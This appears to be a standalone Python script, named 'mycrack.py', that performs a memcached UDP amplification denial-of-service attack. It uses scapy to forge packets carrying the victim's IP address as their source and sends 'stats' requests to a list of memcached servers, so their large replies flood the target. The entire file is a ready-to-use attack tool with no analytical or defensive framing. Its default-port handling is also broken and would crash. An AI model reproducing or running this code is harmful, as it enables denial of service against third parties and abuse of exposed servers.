#-- coding: utf8 --
#!/usr/bin/env python3

from scapy.all import *
import argparse

# Parse CLI arguments and options
argparser = argparse.ArgumentParser(prog="mycrack.py")
argparser.add_argument(
    'memcacheds', 
    help='Path to file with memcached addresses. One per line. Port delimited by ":"'
)
argparser.add_argument(
    'target', 
    help='Target DNS or IP address. Port delimited by ":"'
)
argparser.add_argument(
    'power', 
    help='How many packets to send on single memcached'
)
args = argparser.parse_args()

# read list of memcached servers
memcached_addr_list = []
with open(args.memcacheds) as memcached_addr_file:
    for memcached_addr in memcached_addr_file:
        memcached_host_port = memcached_addr.rstrip().split(":")
        
        if len(memcached_host_port) == 1:
            memcached_host_port[1] = "11211";
        
        memcached_addr_list.append(
            {
                "ip": memcached_host_port[0], 
                "port": memcached_host_port[1]
            }
        )

# target
target = args.target.split(":")
target_host = target[0]
target_port = target[1] if len(target) == 2 else "80" 

data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

for memcached_addr in memcached_addr_list:
    print(
        'Attack %s from %s with payload "%s"' % (
            target_host + ":" + target_port, 
            memcached_addr["ip"] + ":" + memcached_addr["port"], 
            data.strip()
        )
    )

    # spoofing source ip 
    scapy_ip = IP(src=target_host, dst=memcached_addr["ip"])
    scapy_port = UDP(sport=int(target_port), dport=int(memcached_addr["port"]))
    scapy_data = Raw(load=data)

    # send spoofed packets
    send(
        scapy_ip / scapy_port / scapy_data, 
        count=int(args.power)
    )